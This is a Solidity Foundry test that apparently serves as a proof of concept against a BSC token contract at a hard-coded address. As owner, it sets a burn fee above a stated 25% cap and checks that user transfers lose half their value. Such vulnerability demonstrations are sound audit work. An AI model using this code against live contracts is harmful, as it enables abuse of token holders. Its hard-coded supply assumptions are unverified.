```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// Minimal interface for the target contract
interface LinerPowerPoint {
    function owner() external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function changeBurnFee(uint256 _newburnFee, uint256 _newburnDivisor) external;
    function _burnFee() external view returns (uint256);
    function _burnDivisor() external view returns (uint256);
    function excludeFromFee(address account) external;
    function MinTx() external view returns (uint256);
    function MaxTx() external view returns (uint256);
    function decimals() external view returns (uint8);
}

contract ExploitTest is Test {
    LinerPowerPoint public token;
    address public owner;
    address public user1 = address(0x100);
    address public user2 = address(0x200);

    function setUp() public {
        // Target contract address on BSC
        token = LinerPowerPoint(0xf14fe8ea9d35ccea2545985d7541ccad02cb6112);
        owner = token.owner();
        vm.label(owner, "Owner");
        vm.label(address(token), "LPP");
        vm.label(user1, "User1");
        vm.label(user2, "User2");

        // Ensure we have enough tokens for transfers (owner holds minted supply)
        // MinTx is 500 * 1e18, we'll transfer 1000 * 1e18
        uint256 minTx = token.MinTx();
        require(minTx > 0, "MinTx not set");
        uint256 transferAmount = 1000 * 1e18;
        require(transferAmount >= minTx, "Transfer amount below MinTx");

        // Owner transfers tokens to user1 (fee excluded for owner, so no burn)
        vm.prank(owner);
        token.transfer(user1, transferAmount);
        assertEq(token.balanceOf(user1), transferAmount, "User1 should receive full amount");
    }

    function testExcessiveBurnFee() public {
        // Step 1: Owner sets a burn fee that exceeds the intended 25% cap
        // Effective burn rate = _burnFee / (_burnDivisor * 100)
        // Set to 50%: _burnFee = 50000, _burnDivisor = 1000 => 50000/(1000*100) = 0.5
        uint256 newBurnFee = 50000;
        uint256 newBurnDivisor = 1000;
        vm.prank(owner);
        token.changeBurnFee(newBurnFee, newBurnDivisor);

        // Verify new values
        assertEq(token._burnFee(), newBurnFee, "Burn fee should be updated");
        assertEq(token._burnDivisor(), newBurnDivisor, "Burn divisor should be updated");

        // Step 2: User1 transfers tokens to user2 (both not excluded from fee)
        uint256 amount = 1000 * 1e18;
        vm.prank(user1);
        token.transfer(user2, amount);

        // Step 3: Compute expected burn amount
        uint256 expectedBurn = (amount * newBurnFee) / (newBurnDivisor * 100);
        uint256 expectedNet = amount - expectedBurn;

        // Step 4: Verify user2's balance increase is the amount minus burn
        uint256 user2Balance = token.balanceOf(user2);
        assertEq(user2Balance, expectedNet, "User2 should receive net amount after burn");

        // Step 5: Verify total supply decreased by the burn amount
        uint256 supplyDecrease = amount - expectedNet; // equals expectedBurn
        // Note: initial supply before transfer = token.totalSupply() + expectedBurn (since after burn it's reduced)
        // Easier: check that totalSupply decreased by expectedBurn
        // We'll compare with snapshot before transfer
        // Actually we can just check that totalSupply now equals initial supply minus expectedBurn
        uint256 initialSupply = 2100000000 * 1e18; // from constructor
        // Because no other mints/burns happened, and owner's initial mint is all supply.
        // However owner holds part of supply, but total supply should be constant until burn.
        // We'll use current totalSupply after transfer
        uint256 finalSupply = token.totalSupply();
        assertEq(finalSupply, initialSupply - expectedBurn, "Total supply should decrease by burn amount");

        // Step 6: Assert that the burn fee percentage is over 25%
        uint256 burnPercent = (expectedBurn * 100) / amount;
        assertGt(burnPercent, 25, "Burn fee should exceed 25%");
    }
}
```
